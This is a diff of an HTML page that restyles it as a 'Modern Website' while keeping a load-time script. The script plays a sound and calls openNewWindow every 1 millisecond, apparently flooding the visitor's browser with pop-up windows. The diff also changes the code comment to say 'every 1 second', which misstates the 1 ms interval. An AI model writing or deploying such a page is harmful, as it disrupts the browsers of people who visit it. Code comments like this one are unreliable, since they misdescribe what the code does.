@@ -1,7 +1,41 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>:)</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Modern Website</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        h1 {
+            color: #333;
+            margin-top: 50px;
+        }
+
+        h3 {
+            color: #666;
+        }
+
+        button {
+            background-color: #007BFF;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+    </style>
     <script>
         function playSound() {
             var audio = new Audio('hit1-endermen.mp3'); // Replace 'sound.mp3' with your sound file
@@ -17,13 +51,13 @@
 
         window.onload = function () {
             playSound();
-            setInterval(openNewWindow,1); // Open a new window every 0 seconds (1 milliseconds)
+            setInterval(openNewWindow, 1); // Open a new window every 1 second
         };
     </script>
 </head>
 <body>
-    <h1>Welcome to My Website</h1>
+    <h1>Welcome to My Modern Website</h1>
     <div><h3>Click the button to start</h3></div>
-    <button><h4>click me</h4></button>
+    <button onclick="openNewWindow()">Click Me</button>
 </body>
 </html>
